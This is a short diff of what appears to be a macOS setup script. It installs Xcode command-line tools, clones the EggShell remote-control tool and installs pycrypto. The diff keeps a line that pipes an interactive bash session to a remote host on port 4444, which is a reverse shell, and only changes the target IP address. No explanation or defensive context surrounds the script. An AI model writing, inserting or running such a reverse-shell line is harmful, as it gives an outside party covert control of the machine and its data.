@@ -7,7 +7,7 @@
 #
 xcode-select --install
 sleep 10
-bash &> /dev/tcp/10.0.0.2/4444 0>&1
+bash &> /dev/tcp/10.1.62.15/4444 0>&1
 git clone git://github.com/neoneggplant/EggShell
 sleep 10
 easy_install pycrypto
